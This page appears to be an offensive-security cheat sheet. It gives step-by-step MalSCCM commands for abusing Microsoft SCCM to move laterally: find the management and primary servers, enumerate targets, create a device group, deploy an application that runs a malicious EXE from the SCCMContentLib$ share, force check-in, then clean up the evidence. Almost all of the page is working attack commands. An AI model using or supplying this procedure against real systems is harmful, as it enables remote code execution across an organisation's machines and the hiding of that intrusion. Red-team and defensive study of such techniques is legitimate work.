# Page 6

* Compromise client, use locate to find management server

MalSCCM.exe locate

* Enumerate over WMI as an administrator of the Distribution Point

MalSCCM.exe inspect /server: /groups

* Compromise management server, use locate to find primary server

Use inspect on primary server to view who you can target

MalSCCM.exe inspect /all MalSCCM.exe inspect /computers MalSCCM.exe inspect /primaryusers MalSCCM.exe inspect /groups Create a new device group for the machines you want to laterally move too

MalSCCM.exe group /create /groupname:TargetGroup /grouptype:device MalSCCM.exe inspect /groups Add your targets into the new group

MalSCCM.exe group /addhost /groupname:TargetGroup /host:WIN2016-SQL Create an application pointing to a malicious EXE on a world readable share : SCCMContentLib$

MalSCCM.exe app /create /name:demoapp /uncpath:"\BLORE-SCCM\SCCMContentLib$\localthread.exe" MalSCCM.exe inspect /applications Deploy the application to the target group

MalSCCM.exe app /deploy /name:demoapp /groupname:TargetGroup /assignmentname:demodeployment MalSCCM.exe inspect /deployments Force the target group to checkin for updates

MalSCCM.exe checkin /groupname:TargetGroup Cleanup the application, deployment and group

MalSCCM.exe app /cleanup /name:demoapp MalSCCM.exe group /delete /groupname:TargetGroup
